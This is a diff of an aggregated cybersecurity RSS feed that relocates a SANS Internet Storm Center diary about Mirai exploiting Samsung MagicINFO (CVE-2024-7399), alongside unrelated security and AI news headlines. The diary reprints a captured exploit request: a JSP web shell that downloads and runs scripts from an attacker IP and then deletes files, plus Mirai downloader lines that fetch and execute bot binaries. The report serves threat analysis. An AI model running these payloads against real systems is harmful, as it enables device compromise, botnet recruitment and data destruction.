@@ -1,5 +1,97 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Tue, 06 May 2025 01:59:22 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>"Mirai" Now Exploits Samsung MaginINFO CMS (CVE-2024-7399)</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Conclusions</title><link>http://privacyinternational.org/long-read/5570/conclusions</link><guid isPermaLink="false">5570 at http://privacyinternational.org</guid></item><item><title>Analysis: What does this all mean?</title><link>http://privacyinternational.org/long-read/5569/analysis-what-does-all-mean</link><guid isPermaLink="false">5569 at http://privacyinternational.org</guid></item><item><title>Stardust: Research Findings</title><link>http://privacyinternational.org/long-read/5568/stardust-research-findings</link><guid isPermaLink="false">5568 at http://privacyinternational.org</guid></item><item><title>Wocute: Research Findings</title><link>http://privacyinternational.org/long-read/5567/wocute-research-findings</link><guid isPermaLink="false">5567 at http://privacyinternational.org</guid></item><item><title>WomanLog: Research Findings</title><link>http://privacyinternational.org/long-read/5566/womanlog-research-findings</link><guid isPermaLink="false">5566 at http://privacyinternational.org</guid></item><item><title>Period Tracker by GP Apps: Research Findings</title><link>http://privacyinternational.org/long-read/5565/period-tracker-gp-apps-research-findings</link><guid isPermaLink="false">5565 at http://privacyinternational.org</guid></item><item><title>Maya: Research Findings</title><link>http://privacyinternational.org/long-read/5564/maya-research-findings</link><guid isPermaLink="false">5564 at http://privacyinternational.org</guid></item><item><title>Euki: Research Findings</title><link>http://privacyinternational.org/long-read/5563/euki-research-findings</link><guid isPermaLink="false">5563 at http://privacyinternational.org</guid></item><item><title>Period Tracker by Simple Design: Research Findings</title><link>http://privacyinternational.org/long-read/5562/period-tracker-simple-design-research-findings</link><guid isPermaLink="false">5562 at http://privacyinternational.org</guid></item><item><title>Flo: Research Findings</title><link>http://privacyinternational.org/long-read/5561/flo-research-findings</link><guid isPermaLink="false">5561 at http://privacyinternational.org</guid></item><item><title>Bridging the Gap: How Qualys Simplifies NCA ECC 2024 Compliance for Businesses</title><link>https://blog.qualys.com/category/product-tech</link><description>As the digital environment advances, new and more sophisticated cyber threats emerge, necessitating stronger and more adaptive cybersecurity measures. Recognizing this need, the National Cybersecurity Authority (NCA) of Saudi Arabia has introduced the Essential Cybersecurity Controls (ECC) 2024 (ECC–2:2024), an enhanced version of the NCA ECC–1:2018 framework. The ECC–2:2024 framework represents a significant step forward [&amp;#8230;]</description><content:encoded>&lt;p&gt;As the digital environment advances, new and more sophisticated cyber threats emerge, necessitating stronger and more adaptive cybersecurity measures. Recognizing this need, the National Cybersecurity Authority (NCA) of Saudi Arabia has introduced the Essential Cybersecurity Controls (ECC) 2024 (ECC–2:2024), an enhanced version of the NCA ECC–1:2018 framework.&lt;/p&gt;
+<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>RedKey RSS Feed</title><link>https://redkey.tech/feed.xml</link><description>All The Cyber Things.</description><atom:link href="https://redkey.tech/feed.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Tue, 06 May 2025 02:59:21 +0000</lastBuildDate><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>"Mirai" Now Exploits Samsung MagicINFO CMS (CVE-2024-7399)</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>"Mirai" Now Exploits Samsung MagicINFO CMS (CVE-2024-7399), (Mon, May 5th)</title><link>https://isc.sans.edu/diary/rss/31920</link><description>&lt;p&gt;Last August, Samsung patched an arbitrary file upload vulnerability that could lead to remote code execution &amp;#x5b;1&amp;#x5d;. The announcement was very sparse and did not even include affected systems:&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;Last August, Samsung patched an arbitrary file upload vulnerability that could lead to remote code execution [1]. The announcement was very sparse and did not even include affected systems:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;SVP-AUG-2024&lt;br /&gt;
+SVE-2024-50018(CVE-2024-7399)&lt;br /&gt;
+Weakness : Improper limitation of a pathname to a restricted directory vulnerability in Samsung MagicINFO 9 Server allows attackers to write arbitrary file as system authority.&lt;br /&gt;
+Patch information : The patch modifies verification logic of the input.&lt;/code&gt;&lt;br /&gt;
+&amp;nbsp;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;At around the same time, a CVE was assigned to the vulnerability: CVE-2024-7399. The NVD entry has a little bit more details [2]. In particular, it identifies a legacy CMS distributed by Samsung, MagicINFO&amp;nbsp;9, as the vulnerable software:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Improper limitation of a pathname to a restricted directory vulnerability in Samsung MagicINFO 9 Server version before 21.1050 allows attackers to write arbitrary file as system authority.&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;For some reason, this vulnerability was covered in a recent article on Cybersecuritynews, providing additional details [3]:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;According to the technical analysis, the /MagicInfo/servlet/SWUpdateFileUploader endpoint implemented by the SWUpdateFileUploadServlet class contains multiple security issues.&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Sadly, I can not find a reference to the original technical analysis or who it was performed by in Cybersecuritynews article. But we are now seeing some exploit attempts for the issue.&lt;/p&gt;
+
+&lt;p&gt;The POST request we are seeing is a typical &amp;quot;IoT Botnet&amp;quot; style request as we have seen many before. It first uses the magicINFO 9 vulnerability to download a script:&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;POST /MagicInfo/servlet/SWUpdateFileUploader HTTP/1.1&lt;br /&gt;
+User-Agent: python-requests/2.27.1&lt;br /&gt;
+Accept-Encoding: gzip, deflate&lt;br /&gt;
+Accept: */*&lt;br /&gt;
+Connection: keep-alive&lt;br /&gt;
+Content-Length: 1151&lt;br /&gt;
+Content-Type: multipart/form-data; boundary=4f3a72624fa5c399c5d203d3617891cb&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;code&gt;--4f3a72624fa5c399c5d203d3617891cb&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;Content-Disposition: form-data; name=&amp;quot;file&amp;quot;; filename=&amp;quot;1746466018shell.jsp&amp;quot;&lt;br /&gt;
+Content-Type: application/octet-stream&lt;br /&gt;
+&lt;br /&gt;
+&amp;lt;%@ page import=&amp;quot;java.io.*&amp;quot; %&amp;gt;&lt;br /&gt;
+&amp;lt;%&lt;br /&gt;
+try {&lt;br /&gt;
+&amp;nbsp; &amp;nbsp; String[] cmd = {&lt;br /&gt;
+&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;quot;/bin/sh&amp;quot;, &amp;quot;-c&amp;quot;,&lt;br /&gt;
+&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;quot;cd /tmp; cd /var/run; cd /mnt; cd /root; cd /; &amp;quot;&lt;br /&gt;
+&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; + &amp;quot;wget http://176.65.142.122/ohshit.sh; &amp;quot;&lt;br /&gt;
+&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; + &amp;quot;curl -O http://176.65.142.122/ohshit.sh; &amp;quot;&lt;br /&gt;
+&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; + &amp;quot;chmod 777 ohshit.sh; sh ohshit.sh; &amp;quot;&lt;br /&gt;
+&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; + &amp;quot;tftp 176.65.142.122 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; &amp;quot;&lt;br /&gt;
+&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; + &amp;quot;tftp -r ohshit2.sh -g 176.65.142.122; chmod 777 ohshit2.sh; sh ohshit2.sh; &amp;quot;&lt;br /&gt;
+&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; + &amp;quot;ftpget -v -u anonymous -p anonymous -P 21 176.65.142.122 ohshit1.sh ohshit1.sh; sh ohshit1.sh; &amp;quot;&lt;br /&gt;
+&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; + &amp;quot;rm -rf ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *&amp;quot;&lt;br /&gt;
+&amp;nbsp; &amp;nbsp; };&lt;br /&gt;
+&amp;nbsp; &amp;nbsp; Process p = Runtime.getRuntime().exec(cmd);&lt;br /&gt;
+&amp;nbsp; &amp;nbsp; BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));&lt;br /&gt;
+&amp;nbsp; &amp;nbsp; String line;&lt;br /&gt;
+&amp;nbsp; &amp;nbsp; while ((line = reader.readLine()) != null) {&lt;br /&gt;
+&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; out.println(line);&lt;br /&gt;
+&amp;nbsp; &amp;nbsp; }&lt;br /&gt;
+} catch (Exception e) {&lt;br /&gt;
+&amp;nbsp; &amp;nbsp; out.println(&amp;quot;Error: &amp;quot; + e.toString());&lt;br /&gt;
+}&lt;br /&gt;
+%&amp;gt;&lt;br /&gt;
+&lt;br /&gt;
+--4f3a72624fa5c399c5d203d3617891cb--&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The bash script contains the usual &amp;quot;multi-architecture&amp;quot; downloader for the act&lt;code&gt;ual bot. I am only including the first couple lines here as they repeat for different architectures:&lt;/code&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;#!/bin/bash&lt;br /&gt;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.142.122/hiddenbin/boatnet.x86; curl -O http://176.65.142.122/hiddenbin/boatnet.x86;cat boatnet.x86 &amp;gt;WTF;chmod +x *;./WTF&lt;br /&gt;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.142.122/hiddenbin/boatnet.mips; curl -O http://176.65.142.122/hiddenbin/boatnet.mips;cat boatnet.mips &amp;gt;WTF;chmod +x *;./WTF&lt;br /&gt;
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.142.122/hiddenbin/boatnet.arc; curl -O http://176.65.142.122/hiddenbin/boatnet.arc;cat boatnet.arc &amp;gt;WTF;chmod +x *;./WTF&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The &amp;quot;botnet&amp;quot; bot is well recognized by Virustotal and appears to be yet another version of Mirai, which matches the download behavior [4].&lt;/p&gt;
+
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+
+&lt;p&gt;[1]&amp;nbsp;https://security.samsungtv.com/securityUpdates&lt;br /&gt;
+[2]&amp;nbsp;https://nvd.nist.gov/vuln/detail/CVE-2024-7399&lt;br /&gt;
+[3] https://cybersecuritynews.com/samsung-magicinfo-vulnerability/&lt;br /&gt;
+[4]&amp;nbsp;https://www.virustotal.com/gui/file/3f26e58cd09804d9c38c6613fb976d8a680555f3eac38a46ef7f3927beaadd26&lt;/p&gt;
+
+&lt;p&gt;---&lt;br /&gt;
+Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;SANS.edu&lt;/a&gt;&lt;br /&gt;
+&lt;a href="https://jbu.me/164"&gt;Twitter&lt;/a&gt;|&lt;/p&gt;
+
+ 
+ (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31920</guid></item><item><title>Conclusions</title><link>http://privacyinternational.org/long-read/5570/conclusions</link><guid isPermaLink="false">5570 at http://privacyinternational.org</guid></item><item><title>Analysis: What does this all mean?</title><link>http://privacyinternational.org/long-read/5569/analysis-what-does-all-mean</link><guid isPermaLink="false">5569 at http://privacyinternational.org</guid></item><item><title>Stardust: Research Findings</title><link>http://privacyinternational.org/long-read/5568/stardust-research-findings</link><guid isPermaLink="false">5568 at http://privacyinternational.org</guid></item><item><title>Wocute: Research Findings</title><link>http://privacyinternational.org/long-read/5567/wocute-research-findings</link><guid isPermaLink="false">5567 at http://privacyinternational.org</guid></item><item><title>WomanLog: Research Findings</title><link>http://privacyinternational.org/long-read/5566/womanlog-research-findings</link><guid isPermaLink="false">5566 at http://privacyinternational.org</guid></item><item><title>Period Tracker by GP Apps: Research Findings</title><link>http://privacyinternational.org/long-read/5565/period-tracker-gp-apps-research-findings</link><guid isPermaLink="false">5565 at http://privacyinternational.org</guid></item><item><title>Maya: Research Findings</title><link>http://privacyinternational.org/long-read/5564/maya-research-findings</link><guid isPermaLink="false">5564 at http://privacyinternational.org</guid></item><item><title>Euki: Research Findings</title><link>http://privacyinternational.org/long-read/5563/euki-research-findings</link><guid isPermaLink="false">5563 at http://privacyinternational.org</guid></item><item><title>Period Tracker by Simple Design: Research Findings</title><link>http://privacyinternational.org/long-read/5562/period-tracker-simple-design-research-findings</link><guid isPermaLink="false">5562 at http://privacyinternational.org</guid></item><item><title>Flo: Research Findings</title><link>http://privacyinternational.org/long-read/5561/flo-research-findings</link><guid isPermaLink="false">5561 at http://privacyinternational.org</guid></item><item><title>Bridging the Gap: How Qualys Simplifies NCA ECC 2024 Compliance for Businesses</title><link>https://blog.qualys.com/category/product-tech</link><description>As the digital environment advances, new and more sophisticated cyber threats emerge, necessitating stronger and more adaptive cybersecurity measures. Recognizing this need, the National Cybersecurity Authority (NCA) of Saudi Arabia has introduced the Essential Cybersecurity Controls (ECC) 2024 (ECC–2:2024), an enhanced version of the NCA ECC–1:2018 framework. The ECC–2:2024 framework represents a significant step forward [&amp;#8230;]</description><content:encoded>&lt;p&gt;As the digital environment advances, new and more sophisticated cyber threats emerge, necessitating stronger and more adaptive cybersecurity measures. Recognizing this need, the National Cybersecurity Authority (NCA) of Saudi Arabia has introduced the Essential Cybersecurity Controls (ECC) 2024 (ECC–2:2024), an enhanced version of the NCA ECC–1:2018 framework.&lt;/p&gt;
 
 
 
@@ -137,99 +229,7 @@
 
 
 
-&lt;hr class="wp-block-separator has-alpha-channel-opacity" /&gt;</content:encoded><guid isPermaLink="false">https://blog.qualys.com/?p=37799</guid><category>Product and Tech</category><category>compliance</category><category>NCA ECC 2024</category><category>Qualys Policy Audit</category></item><item><title>Signal Clone Used by Mike Waltz Pauses Service After Reports It Got Hacked</title><link>https://www.wired.com/story/signal-clone-used-by-mike-waltz-pauses-service-after-reports-it-got-hacked/</link><description>The communications app TeleMessage, which was spotted on former US national security adviser Mike Waltz's phone, has suspended “all services” as it investigates reports of at least one breach.</description><guid isPermaLink="false">6818ff95c730f6562622ddd4</guid><category>Security</category><category>Security / Cyberattacks and Hacks</category><category>Security / National Security</category><category>Security / Security News</category><category>Politics / Politics News</category><category>cybersecurity</category><category>hacks</category><category>security</category><category>Donald Trump</category><category>politics</category><category>end-to-end encryption</category><category>Signal</category><category>government</category><category>privacy</category><category>surveillance</category><category>Phone Wars</category></item><item><title>"Mirai" Now Exploits Samsung MaginINFO CMS (CVE-2024-7399), (Mon, May 5th)</title><link>https://isc.sans.edu/diary/rss/31920</link><description>&lt;p&gt;Last August, Samsung patched an arbitrary file upload vulnerability that could lead to remote code execution &amp;#x5b;1&amp;#x5d;. The announcement was very sparse and did not even include affected systems:&lt;/p&gt;&amp;#xd;</description><content:encoded>&lt;p&gt;Last August, Samsung patched an arbitrary file upload vulnerability that could lead to remote code execution [1]. The announcement was very sparse and did not even include affected systems:&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;&lt;code&gt;SVP-AUG-2024&lt;br /&gt;
-SVE-2024-50018(CVE-2024-7399)&lt;br /&gt;
-Weakness : Improper limitation of a pathname to a restricted directory vulnerability in Samsung MagicINFO 9 Server allows attackers to write arbitrary file as system authority.&lt;br /&gt;
-Patch information : The patch modifies verification logic of the input.&lt;/code&gt;&lt;br /&gt;
-&amp;nbsp;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;At around the same time, a CVE was assigned to the vulnerability: CVE-2024-7399. The NVD entry has a little bit more details [2]. In particular, it identifies a legacy CMS distributed by Samsung, MagicINFO&amp;nbsp;9, as the vulnerable software:&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;&lt;code&gt;Improper limitation of a pathname to a restricted directory vulnerability in Samsung MagicINFO 9 Server version before 21.1050 allows attackers to write arbitrary file as system authority.&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;For some reason, this vulnerability was covered in a recent article on Cybersecuritynews, providing additional details [3]:&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;&lt;code&gt;According to the technical analysis, the /MagicInfo/servlet/SWUpdateFileUploader endpoint implemented by the SWUpdateFileUploadServlet class contains multiple security issues.&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Sadly, I can not find a reference to the original technical analysis or who it was performed by in Cybersecuritynews article. But we are now seeing some exploit attempts for the issue.&lt;/p&gt;
-
-&lt;p&gt;The POST request we are seeing is a typical &amp;quot;IoT Botnet&amp;quot; style request as we have seen many before. It first uses the magicINFO 9 vulnerability to download a script:&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;&lt;code&gt;POST /MagicInfo/servlet/SWUpdateFileUploader HTTP/1.1&lt;br /&gt;
-User-Agent: python-requests/2.27.1&lt;br /&gt;
-Accept-Encoding: gzip, deflate&lt;br /&gt;
-Accept: */*&lt;br /&gt;
-Connection: keep-alive&lt;br /&gt;
-Content-Length: 1151&lt;br /&gt;
-Content-Type: multipart/form-data; boundary=4f3a72624fa5c399c5d203d3617891cb&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;code&gt;--4f3a72624fa5c399c5d203d3617891cb&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code&gt;Content-Disposition: form-data; name=&amp;quot;file&amp;quot;; filename=&amp;quot;1746466018shell.jsp&amp;quot;&lt;br /&gt;
-Content-Type: application/octet-stream&lt;br /&gt;
-&lt;br /&gt;
-&amp;lt;%@ page import=&amp;quot;java.io.*&amp;quot; %&amp;gt;&lt;br /&gt;
-&amp;lt;%&lt;br /&gt;
-try {&lt;br /&gt;
-&amp;nbsp; &amp;nbsp; String[] cmd = {&lt;br /&gt;
-&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;quot;/bin/sh&amp;quot;, &amp;quot;-c&amp;quot;,&lt;br /&gt;
-&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;quot;cd /tmp; cd /var/run; cd /mnt; cd /root; cd /; &amp;quot;&lt;br /&gt;
-&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; + &amp;quot;wget http://176.65.142.122/ohshit.sh; &amp;quot;&lt;br /&gt;
-&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; + &amp;quot;curl -O http://176.65.142.122/ohshit.sh; &amp;quot;&lt;br /&gt;
-&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; + &amp;quot;chmod 777 ohshit.sh; sh ohshit.sh; &amp;quot;&lt;br /&gt;
-&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; + &amp;quot;tftp 176.65.142.122 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; &amp;quot;&lt;br /&gt;
-&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; + &amp;quot;tftp -r ohshit2.sh -g 176.65.142.122; chmod 777 ohshit2.sh; sh ohshit2.sh; &amp;quot;&lt;br /&gt;
-&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; + &amp;quot;ftpget -v -u anonymous -p anonymous -P 21 176.65.142.122 ohshit1.sh ohshit1.sh; sh ohshit1.sh; &amp;quot;&lt;br /&gt;
-&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; + &amp;quot;rm -rf ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *&amp;quot;&lt;br /&gt;
-&amp;nbsp; &amp;nbsp; };&lt;br /&gt;
-&amp;nbsp; &amp;nbsp; Process p = Runtime.getRuntime().exec(cmd);&lt;br /&gt;
-&amp;nbsp; &amp;nbsp; BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));&lt;br /&gt;
-&amp;nbsp; &amp;nbsp; String line;&lt;br /&gt;
-&amp;nbsp; &amp;nbsp; while ((line = reader.readLine()) != null) {&lt;br /&gt;
-&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; out.println(line);&lt;br /&gt;
-&amp;nbsp; &amp;nbsp; }&lt;br /&gt;
-} catch (Exception e) {&lt;br /&gt;
-&amp;nbsp; &amp;nbsp; out.println(&amp;quot;Error: &amp;quot; + e.toString());&lt;br /&gt;
-}&lt;br /&gt;
-%&amp;gt;&lt;br /&gt;
-&lt;br /&gt;
---4f3a72624fa5c399c5d203d3617891cb--&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;The bash script contains the usual &amp;quot;multi-architecture&amp;quot; downloader for the act&lt;code&gt;ual bot. I am only including the first couple lines here as they repeat for different architectures:&lt;/code&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;&lt;code&gt;#!/bin/bash&lt;br /&gt;
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.142.122/hiddenbin/boatnet.x86; curl -O http://176.65.142.122/hiddenbin/boatnet.x86;cat boatnet.x86 &amp;gt;WTF;chmod +x *;./WTF&lt;br /&gt;
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.142.122/hiddenbin/boatnet.mips; curl -O http://176.65.142.122/hiddenbin/boatnet.mips;cat boatnet.mips &amp;gt;WTF;chmod +x *;./WTF&lt;br /&gt;
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.142.122/hiddenbin/boatnet.arc; curl -O http://176.65.142.122/hiddenbin/boatnet.arc;cat boatnet.arc &amp;gt;WTF;chmod +x *;./WTF&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;The &amp;quot;botnet&amp;quot; bot is well recognized by Virustotal and appears to be yet another version of Mirai, which matches the download behavior [4].&lt;/p&gt;
-
-&lt;p&gt;&amp;nbsp;&lt;/p&gt;
-
-&lt;p&gt;[1]&amp;nbsp;https://security.samsungtv.com/securityUpdates&lt;br /&gt;
-[2]&amp;nbsp;https://nvd.nist.gov/vuln/detail/CVE-2024-7399&lt;br /&gt;
-[3] https://cybersecuritynews.com/samsung-magicinfo-vulnerability/&lt;br /&gt;
-[4]&amp;nbsp;https://www.virustotal.com/gui/file/3f26e58cd09804d9c38c6613fb976d8a680555f3eac38a46ef7f3927beaadd26&lt;/p&gt;
-
-&lt;p&gt;---&lt;br /&gt;
-Johannes B. Ullrich, Ph.D. , Dean of Research, &lt;a href="https://sans.edu"&gt;SANS.edu&lt;/a&gt;&lt;br /&gt;
-&lt;a href="https://jbu.me/164"&gt;Twitter&lt;/a&gt;|&lt;/p&gt;
-
- 
- (c) SANS Internet Storm Center. https://isc.sans.edu Creative Commons Attribution-Noncommercial 3.0 United States License.</content:encoded><guid isPermaLink="false">https://isc.sans.edu/diary/rss/31920</guid></item><item><title>Google’s AI Mode Provides ‘Powerful and Rich’ Responses: Who Can Use It Now?</title><link>https://www.techrepublic.com/article/news-google-ai-mode/</link><description>Recently made available to the general public at no cost, Google’s AI Mode leverages the company’s search functionality to launch an AI platform that competes with ChatGPT.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4305071</guid><category>Artificial Intelligence</category><category>Google</category><category>News</category><category>ai</category><category>anthropic claude</category><category>artificial intelligence</category><category>gemini 2.0</category><category>google ai mode</category><category>openai chatgpt</category><category>perplexity</category></item><item><title>Apple &amp; Anthropic Partner on AI-Powered Vibe-Coding Tool – Public Release TBD</title><link>https://www.techrepublic.com/article/news-apple-anthropic-ai-vibe-coding-tool/</link><description>This vibe-coding tool is only being tested inside Apple; the company hasn’t decided whether to release the platform to outside developers.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4305060</guid><category>Apple</category><category>Artificial Intelligence</category><category>Developer</category><category>News</category><category>ai</category><category>Amazon</category><category>amazon alexa</category><category>anthropic</category><category>artificial intelligence</category><category>coding</category><category>developers</category><category>vibe coding</category></item><item><title>Another Move in the Deepfake Creation/Detection Arms Race</title><link>https://www.schneier.com/blog/archives/2025/05/another-move-in-the-deepfake-creation-detection-arms-race.html</link><description>&lt;p&gt;Deepfakes are now &lt;a href="https://studyfinds.org/deepfakes-outsmarting-detection-heartbeats/"&gt;mimicking heartbeats&lt;/a&gt;&lt;/p&gt;
+&lt;hr class="wp-block-separator has-alpha-channel-opacity" /&gt;</content:encoded><guid isPermaLink="false">https://blog.qualys.com/?p=37799</guid><category>Product and Tech</category><category>compliance</category><category>NCA ECC 2024</category><category>Qualys Policy Audit</category></item><item><title>Signal Clone Used by Mike Waltz Pauses Service After Reports It Got Hacked</title><link>https://www.wired.com/story/signal-clone-used-by-mike-waltz-pauses-service-after-reports-it-got-hacked/</link><description>The communications app TeleMessage, which was spotted on former US national security adviser Mike Waltz's phone, has suspended “all services” as it investigates reports of at least one breach.</description><guid isPermaLink="false">6818ff95c730f6562622ddd4</guid><category>Security</category><category>Security / Cyberattacks and Hacks</category><category>Security / National Security</category><category>Security / Security News</category><category>Politics / Politics News</category><category>cybersecurity</category><category>hacks</category><category>security</category><category>Donald Trump</category><category>politics</category><category>end-to-end encryption</category><category>Signal</category><category>government</category><category>privacy</category><category>surveillance</category><category>Phone Wars</category></item><item><title>Google’s AI Mode Provides ‘Powerful and Rich’ Responses: Who Can Use It Now?</title><link>https://www.techrepublic.com/article/news-google-ai-mode/</link><description>Recently made available to the general public at no cost, Google’s AI Mode leverages the company’s search functionality to launch an AI platform that competes with ChatGPT.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4305071</guid><category>Artificial Intelligence</category><category>Google</category><category>News</category><category>ai</category><category>anthropic claude</category><category>artificial intelligence</category><category>gemini 2.0</category><category>google ai mode</category><category>openai chatgpt</category><category>perplexity</category></item><item><title>Apple &amp; Anthropic Partner on AI-Powered Vibe-Coding Tool – Public Release TBD</title><link>https://www.techrepublic.com/article/news-apple-anthropic-ai-vibe-coding-tool/</link><description>This vibe-coding tool is only being tested inside Apple; the company hasn’t decided whether to release the platform to outside developers.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4305060</guid><category>Apple</category><category>Artificial Intelligence</category><category>Developer</category><category>News</category><category>ai</category><category>Amazon</category><category>amazon alexa</category><category>anthropic</category><category>artificial intelligence</category><category>coding</category><category>developers</category><category>vibe coding</category></item><item><title>Another Move in the Deepfake Creation/Detection Arms Race</title><link>https://www.schneier.com/blog/archives/2025/05/another-move-in-the-deepfake-creation-detection-arms-race.html</link><description>&lt;p&gt;Deepfakes are now &lt;a href="https://studyfinds.org/deepfakes-outsmarting-detection-heartbeats/"&gt;mimicking heartbeats&lt;/a&gt;&lt;/p&gt;
 &lt;blockquote&gt;&lt;p&gt;In a nutshell&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Recent research reveals that high-quality deepfakes unintentionally retain the heartbeat patterns from their source videos, undermining traditional detection methods that relied on detecting subtle skin color changes linked to heartbeats.
